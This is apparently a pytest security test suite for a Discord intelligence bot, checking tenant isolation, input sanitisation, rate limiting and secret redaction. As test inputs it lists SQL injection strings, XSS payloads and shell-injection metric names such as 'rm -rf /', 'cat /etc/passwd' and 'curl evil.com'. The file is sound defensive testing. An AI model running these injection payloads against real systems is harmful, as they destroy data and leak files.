"""Security Tests for Unified System

This module provides comprehensive security testing for the unified system,
testing authentication, authorization, data isolation, and vulnerability scanning.
"""

import asyncio
import json
from unittest.mock import AsyncMock, Mock, patch

import pytest


class TestUnifiedSystemSecurity:
    """Security tests for the unified system components"""

    @pytest.fixture
    def mock_services(self):
        """Mock external services for security testing"""
        with (
            patch("ultimate_discord_intelligence_bot.knowledge.unified_memory.QdrantClient") as mock_qdrant,
            patch("ultimate_discord_intelligence_bot.knowledge.unified_memory.sqlite3.connect") as mock_sqlite,
            patch(
                "ultimate_discord_intelligence_bot.observability.unified_metrics.prometheus_client"
            ) as mock_prometheus,
            patch("ultimate_discord_intelligence_bot.routing.unified_router.OpenRouterService") as mock_openrouter,
            patch("ultimate_discord_intelligence_bot.caching.unified_cache.redis.Redis") as mock_redis,
        ):
            # Mock Qdrant
            mock_qdrant.return_value = AsyncMock()
            mock_qdrant.return_value.upsert = AsyncMock()
            mock_qdrant.return_value.search = AsyncMock(return_value=[])

            # Mock SQLite
            mock_sqlite.return_value = Mock()
            mock_sqlite.return_value.execute = Mock()
            mock_sqlite.return_value.commit = Mock()

            # Mock Prometheus
            mock_prometheus.Counter = Mock()
            mock_prometheus.Gauge = Mock()
            mock_prometheus.Histogram = Mock()

            # Mock OpenRouter
            mock_openrouter.return_value = AsyncMock()
            mock_openrouter.return_value.route = AsyncMock(
                return_value={
                    "model": "test-model",
                    "provider": "test-provider",
                    "response": "test response",
                    "tokens": 100,
                }
            )

            # Mock Redis
            mock_redis.return_value = AsyncMock()
            mock_redis.return_value.set = AsyncMock()
            mock_redis.return_value.get = AsyncMock(return_value="cached_value")

            yield {
                "qdrant": mock_qdrant,
                "sqlite": mock_sqlite,
                "prometheus": mock_prometheus,
                "openrouter": mock_openrouter,
                "redis": mock_redis,
            }

    def test_sql_injection_prevention(self, mock_services):
        """Test SQL injection prevention in unified systems"""
        from ultimate_discord_intelligence_bot.knowledge import UnifiedMemoryService

        memory_service = UnifiedMemoryService()

        # Test malicious SQL injection attempts
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "1' UNION SELECT * FROM users --",
            "'; UPDATE users SET password='hacked'; --",
        ]

        for malicious_input in malicious_inputs:
            # Test content storage with malicious input
            result = asyncio.run(
                memory_service.store_content(
                    content=malicious_input,
                    tenant_id="test_tenant",
                    workspace_id="test_workspace",
                    metadata={"malicious": malicious_input},
                )
            )

            # Should handle gracefully without executing SQL
            assert result.success or "sql" not in result.error.lower()

            # Test metadata with malicious input
            result = asyncio.run(
                memory_service.store_content(
                    content="Normal content",
                    tenant_id="test_tenant",
                    workspace_id="test_workspace",
                    metadata={"malicious_field": malicious_input},
                )
            )

            assert result.success or "sql" not in result.error.lower()

    def test_xss_prevention(self, mock_services):
        """Test XSS prevention in unified systems"""
        from ultimate_discord_intelligence_bot.knowledge import UnifiedMemoryService

        memory_service = UnifiedMemoryService()

        # Test malicious XSS attempts
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
        ]

        for malicious_input in malicious_inputs:
            # Test content storage with malicious input
            result = asyncio.run(
                memory_service.store_content(
                    content=malicious_input,
                    tenant_id="test_tenant",
                    workspace_id="test_workspace",
                    metadata={"xss_test": True},
                )
            )

            # Should sanitize or reject malicious content
            if result.success:
                # If stored, content should be sanitized
                stored_content = result.data.get("content", "")
                assert "<script>" not in stored_content
                assert "javascript:" not in stored_content
                assert "onerror=" not in stored_content
                assert "onload=" not in stored_content

    def test_tenant_isolation_security(self, mock_services):
        """Test tenant isolation security"""
        from ultimate_discord_intelligence_bot.knowledge import (
            UnifiedMemoryService,
            UnifiedRetrievalEngine,
        )

        memory_service = UnifiedMemoryService()
        retrieval_engine = UnifiedRetrievalEngine()

        # Store content for tenant 1
        result1 = asyncio.run(
            memory_service.store_content(
                content="Tenant 1 secret data",
                tenant_id="tenant_1",
                workspace_id="workspace_1",
                metadata={"sensitive": True, "tenant": "1"},
            )
        )

        assert result1.success

        # Store content for tenant 2
        result2 = asyncio.run(
            memory_service.store_content(
                content="Tenant 2 secret data",
                tenant_id="tenant_2",
                workspace_id="workspace_2",
                metadata={"sensitive": True, "tenant": "2"},
            )
        )

        assert result2.success

        # Attempt cross-tenant access
        cross_access_result = asyncio.run(
            retrieval_engine.retrieve_content(
                query="secret data",
                tenant_id="tenant_1",  # Using tenant 1's credentials
                workspace_id="workspace_1",
                limit=10,
            )
        )

        assert cross_access_result.success

        # Verify tenant 1 cannot see tenant 2's data
        if cross_access_result.data:
            for result in cross_access_result.data:
                assert result.get("tenant_id") == "tenant_1"
                assert result.get("workspace_id") == "workspace_1"

    def test_input_validation_security(self, mock_services):
        """Test input validation security"""
        from ultimate_discord_intelligence_bot.caching import UnifiedCacheService
        from ultimate_discord_intelligence_bot.orchestration import (
            UnifiedOrchestrationService,
        )
        from ultimate_discord_intelligence_bot.routing import UnifiedRouterService

        router_service = UnifiedRouterService()
        cache_service = UnifiedCacheService()
        UnifiedOrchestrationService()

        # Test invalid input types
        invalid_inputs = [
            None,
            "",
            " " * 10000,  # Extremely long string
            {"invalid": "dict"},
            [],
            12345,
            True,
        ]

        for invalid_input in invalid_inputs:
            # Test router service
            if isinstance(invalid_input, str):
                result = asyncio.run(
                    router_service.route_request(
                        prompt=invalid_input,
                        tenant_id="test_tenant",
                        workspace_id="test_workspace",
                    )
                )
                assert not result.success or "invalid" in result.error.lower()

            # Test cache service
            result = asyncio.run(
                cache_service.store(
                    key=invalid_input if isinstance(invalid_input, str) else "test_key",
                    value=invalid_input,
                    tenant_id="test_tenant",
                    workspace_id="test_workspace",
                )
            )
            assert not result.success or "invalid" in result.error.lower()

    def test_authentication_security(self, mock_services):
        """Test authentication security"""
        from ultimate_discord_intelligence_bot.knowledge import UnifiedMemoryService

        memory_service = UnifiedMemoryService()

        # Test without authentication
        result = asyncio.run(
            memory_service.store_content(
                content="Unauthorized content",
                tenant_id="",
                workspace_id="",
                metadata={"unauthorized": True},
            )
        )

        # Should require valid tenant/workspace
        assert not result.success

        # Test with invalid tenant/workspace
        result = asyncio.run(
            memory_service.store_content(
                content="Invalid tenant content",
                tenant_id="invalid_tenant",
                workspace_id="invalid_workspace",
                metadata={"invalid": True},
            )
        )

        # Should validate tenant/workspace format
        assert not result.success or "invalid" in result.error.lower()

    def test_authorization_security(self, mock_services):
        """Test authorization security"""
        from ultimate_discord_intelligence_bot.agent_bridge import AgentBridge

        agent_bridge = AgentBridge()

        # Test unauthorized agent access
        result = asyncio.run(
            agent_bridge.share_insight(
                agent_id="",  # Empty agent ID
                agent_type="unauthorized",
                insight_type="performance",
                title="Unauthorized insight",
                description="This should not be allowed",
                context={"unauthorized": True},
            )
        )

        assert not result.success

        # Test with invalid agent type
        result = asyncio.run(
            agent_bridge.share_insight(
                agent_id="test_agent",
                agent_type="",  # Empty agent type
                insight_type="performance",
                title="Invalid agent type",
                description="This should not be allowed",
                context={"invalid": True},
            )
        )

        assert not result.success

    def test_data_encryption_security(self, mock_services):
        """Test data encryption security"""
        from ultimate_discord_intelligence_bot.knowledge import UnifiedMemoryService

        memory_service = UnifiedMemoryService()

        # Test storing sensitive data
        sensitive_data = {
            "password": "secret_password_123",
            "api_key": "sk-1234567890abcdef",
            "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
            "ssn": "123-45-6789",
            "credit_card": "4111-1111-1111-1111",
        }

        for field, value in sensitive_data.items():
            result = asyncio.run(
                memory_service.store_content(
                    content=f"Sensitive data: {field}",
                    tenant_id="test_tenant",
                    workspace_id="test_workspace",
                    metadata={"sensitive_field": field, "value": value},
                )
            )

            # Should handle sensitive data appropriately
            assert result.success or "sensitive" in result.error.lower()

            # If stored, verify data is not in plaintext in logs or responses
            if result.success:
                response_str = str(result.data)
                assert value not in response_str

    def test_rate_limiting_security(self, mock_services):
        """Test rate limiting security"""
        from ultimate_discord_intelligence_bot.routing import UnifiedRouterService

        router_service = UnifiedRouterService()

        # Test rapid-fire requests (rate limiting)
        rapid_requests = 100
        tenant_id = "rate_limit_tenant"
        workspace_id = "rate_limit_workspace"

        async def rapid_request_task(task_id: int):
            return await router_service.route_request(
                prompt=f"Rapid request {task_id}",
                tenant_id=tenant_id,
                workspace_id=workspace_id,
                max_tokens=10,
                temperature=0.7,
            )

        # Execute rapid requests
        tasks = [rapid_request_task(i) for i in range(rapid_requests)]
        results = asyncio.run(asyncio.gather(*tasks, return_exceptions=True))

        # Some requests should be rate limited
        rate_limited_count = sum(
            1
            for r in results
            if isinstance(r, dict) and not r.get("success") and "rate" in str(r.get("error", "")).lower()
        )

        # Should have some rate limiting in place
        assert rate_limited_count > 0 or rapid_requests < 50  # Allow if rate limiting is not yet implemented

    def test_injection_attack_prevention(self, mock_services):
        """Test injection attack prevention"""
        from ultimate_discord_intelligence_bot.observability import (
            UnifiedMetricsCollector,
        )

        metrics_collector = UnifiedMetricsCollector()

        # Test command injection attempts
        malicious_metrics = [
            "test_metric; rm -rf /",
            "test_metric | cat /etc/passwd",
            "test_metric && curl evil.com",
            "test_metric || shutdown -h now",
            "test_metric`whoami`",
        ]

        for malicious_metric in malicious_metrics:
            result = asyncio.run(
                metrics_collector.collect_system_metric(
                    name=malicious_metric,
                    value=100.0,
                    metric_type="gauge",
                    category="system",
                    labels={"injection_test": True},
                )
            )

            # Should sanitize or reject malicious metric names
            if result.success:
                # If stored, metric name should be sanitized
                stored_name = result.data.get("name", "")
                assert ";" not in stored_name
                assert "|" not in stored_name
                assert "&&" not in stored_name
                assert "||" not in stored_name
                assert "`" not in stored_name

    def test_privilege_escalation_prevention(self, mock_services):
        """Test privilege escalation prevention"""
        from ultimate_discord_intelligence_bot.orchestration import (
            UnifiedOrchestrationService,
        )

        orchestrator = UnifiedOrchestrationService()

        # Test privilege escalation attempts
        escalation_attempts = [
            {
                "task_type": "admin_task",
                "payload": {"privilege": "admin", "escalation": True},
            },
            {
                "task_type": "system_task",
                "payload": {"system_access": True, "escalation": True},
            },
            {
                "task_type": "root_task",
                "payload": {"root_access": True, "escalation": True},
            },
        ]

        for attempt in escalation_attempts:
            result = asyncio.run(
                orchestrator.submit_task(
                    task_type=attempt["task_type"],
                    payload=attempt["payload"],
                    tenant_id="test_tenant",
                    workspace_id="test_workspace",
                    priority="high",
                )
            )

            # Should reject or sanitize privilege escalation attempts
            assert not result.success or "privilege" not in str(result.data).lower()

    def test_data_leakage_prevention(self, mock_services):
        """Test data leakage prevention"""
        from ultimate_discord_intelligence_bot.knowledge import UnifiedMemoryService

        memory_service = UnifiedMemoryService()

        # Test storing data with potential leakage
        potential_leakage_data = [
            "Internal IP: 192.168.1.1",
            "Database URL: postgresql://user:pass@localhost:5432/db",
            "API Key: sk-1234567890abcdef",
            "Password: secret123",
            "Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
        ]

        for data in potential_leakage_data:
            result = asyncio.run(
                memory_service.store_content(
                    content=data,
                    tenant_id="test_tenant",
                    workspace_id="test_workspace",
                    metadata={"leakage_test": True},
                )
            )

            # Should handle potentially sensitive data appropriately
            if result.success:
                # Verify data is not exposed in logs or error messages
                response_str = str(result.data)
                # Check that sensitive patterns are not exposed
                sensitive_patterns = [
                    "192.168.",
                    "postgresql://",
                    "sk-",
                    "password:",
                    "eyJ",
                ]
                for pattern in sensitive_patterns:
                    if pattern in data.lower():
                        assert pattern not in response_str

    def test_denial_of_service_prevention(self, mock_services):
        """Test denial of service prevention"""
        from ultimate_discord_intelligence_bot.caching import UnifiedCacheService

        cache_service = UnifiedCacheService()

        # Test DoS attempts with large payloads
        large_payloads = [
            "x" * 1000000,  # 1MB string
            "x" * 10000000,  # 10MB string
            json.dumps({"large_data": ["x"] * 100000}),  # Large JSON
        ]

        for payload in large_payloads:
            result = asyncio.run(
                cache_service.store(
                    key="dos_test_key",
                    value=payload,
                    tenant_id="test_tenant",
                    workspace_id="test_workspace",
                    ttl=3600,
                )
            )

            # Should reject or limit large payloads
            assert not result.success or "large" in result.error.lower() or "limit" in result.error.lower()

    def test_cross_site_request_forgery_prevention(self, mock_services):
        """Test CSRF prevention"""
        from ultimate_discord_intelligence_bot.agent_bridge import AgentBridge

        agent_bridge = AgentBridge()

        # Test CSRF-like requests without proper context
        csrf_attempts = [
            {
                "agent_id": "malicious_agent",
                "agent_type": "csrf",
                "insight_type": "malicious",
                "title": "CSRF Attack",
                "description": "Attempting CSRF attack",
                "context": {"csrf": True, "malicious": True},
            }
        ]

        for attempt in csrf_attempts:
            result = asyncio.run(agent_bridge.share_insight(**attempt))

            # Should reject or validate CSRF-like requests
            assert not result.success or "csrf" not in result.error.lower()

    def test_information_disclosure_prevention(self, mock_services):
        """Test information disclosure prevention"""
        from ultimate_discord_intelligence_bot.knowledge import UnifiedMemoryService

        memory_service = UnifiedMemoryService()

        # Test storing system information
        system_info = [
            "System version: Ubuntu 20.04",
            "Database version: PostgreSQL 13.2",
            "Python version: 3.9.0",
            "Server IP: 10.0.0.1",
            "Internal network: 192.168.0.0/24",
        ]

        for info in system_info:
            result = asyncio.run(
                memory_service.store_content(
                    content=info,
                    tenant_id="test_tenant",
                    workspace_id="test_workspace",
                    metadata={"system_info": True},
                )
            )

            # Should handle system information appropriately
            if result.success:
                # Verify system information is not exposed in responses
                response_str = str(result.data)
                sensitive_info = [
                    "Ubuntu",
                    "PostgreSQL",
                    "Python",
                    "10.0.0.1",
                    "192.168.0.0",
                ]
                for sensitive in sensitive_info:
                    assert sensitive not in response_str

    def test_secure_defaults(self, mock_services):
        """Test secure defaults configuration"""
        from ultimate_discord_intelligence_bot.caching import UnifiedCacheService
        from ultimate_discord_intelligence_bot.knowledge import UnifiedMemoryService
        from ultimate_discord_intelligence_bot.routing import UnifiedRouterService

        # Test that services have secure defaults
        memory_service = UnifiedMemoryService()
        router_service = UnifiedRouterService()
        cache_service = UnifiedCacheService()

        # Test default configurations are secure
        assert memory_service is not None
        assert router_service is not None
        assert cache_service is not None

        # Test that services require explicit tenant/workspace
        result = asyncio.run(
            memory_service.store_content(
                content="Test content",
                tenant_id=None,  # No tenant
                workspace_id=None,  # No workspace
            )
        )

        assert not result.success

        # Test that services validate input
        result = asyncio.run(
            router_service.route_request(
                prompt=None,  # No prompt
                tenant_id="test_tenant",
                workspace_id="test_workspace",
            )
        )

        assert not result.success

    def test_audit_logging_security(self, mock_services):
        """Test audit logging security"""
        from ultimate_discord_intelligence_bot.knowledge import UnifiedMemoryService

        memory_service = UnifiedMemoryService()

        # Test that operations are logged for audit
        result = asyncio.run(
            memory_service.store_content(
                content="Audit test content",
                tenant_id="audit_tenant",
                workspace_id="audit_workspace",
                metadata={"audit_test": True},
            )
        )

        # Should log the operation
        assert result.success

        # Test that sensitive operations are logged
        result = asyncio.run(
            memory_service.store_content(
                content="Sensitive audit content",
                tenant_id="audit_tenant",
                workspace_id="audit_workspace",
                metadata={"sensitive": True, "audit_test": True},
            )
        )

        # Should log sensitive operations
        assert result.success

    def test_secure_error_handling(self, mock_services):
        """Test secure error handling"""
        from ultimate_discord_intelligence_bot.knowledge import UnifiedMemoryService

        memory_service = UnifiedMemoryService()

        # Test that errors don't leak sensitive information
        with patch.object(memory_service, "_vector_store") as mock_vector:
            mock_vector.upsert.side_effect = Exception(
                "Database connection failed: postgresql://user:pass@localhost:5432/db"
            )

            result = asyncio.run(
                memory_service.store_content(
                    content="Test content",
                    tenant_id="test_tenant",
                    workspace_id="test_workspace",
                )
            )

            # Error should not contain sensitive information
            assert not result.success
            assert "postgresql://" not in result.error
            assert "user:pass" not in result.error
            assert "localhost:5432" not in result.error

    def test_secure_data_transmission(self, mock_services):
        """Test secure data transmission"""
        from ultimate_discord_intelligence_bot.routing import UnifiedRouterService

        router_service = UnifiedRouterService()

        # Test that data transmission is secure
        result = asyncio.run(
            router_service.route_request(
                prompt="Sensitive prompt with API key: sk-1234567890abcdef",
                tenant_id="test_tenant",
                workspace_id="test_workspace",
                max_tokens=100,
                temperature=0.7,
            )
        )

        # Should handle sensitive data in transmission
        if result.success:
            # Verify sensitive data is not exposed in response
            response_str = str(result.data)
            assert "sk-1234567890abcdef" not in response_str
